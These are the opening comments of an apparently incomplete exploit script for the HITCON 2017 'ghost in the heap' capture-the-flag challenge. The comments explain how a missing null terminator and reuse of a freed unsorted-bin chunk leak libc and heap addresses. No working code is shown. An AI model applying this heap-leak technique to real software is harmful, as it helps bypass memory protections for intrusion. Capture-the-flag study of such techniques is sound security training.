# thanks to https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap

# this exploit is incomplete! we only leak the address of libc and an address from the heap

# part 1: leaking a heap address and finding the base address of libc

# the "Add ghost" functionality allocates a ghost on the heap, i.e. a struct containing
# a description and a magic number both supplied by the user
# the "Watch ghost" functionality just prints the description of the ghost
# if the supplied description does not end with a newline, no null terminator is appended
# to the string: printing the description will result in a data leak from the heap

# we want to leak both an address of libc and an address of the heap
# how can we do it? we need to find a way to allocate the ghost in any part
# of the heap which contained (before the allocation) a free chunk linked in the unsorted bin
# in this way, we can leak, for example, the back pointer to the previous chunk (which is either
# an address of libc or an address of the heap)
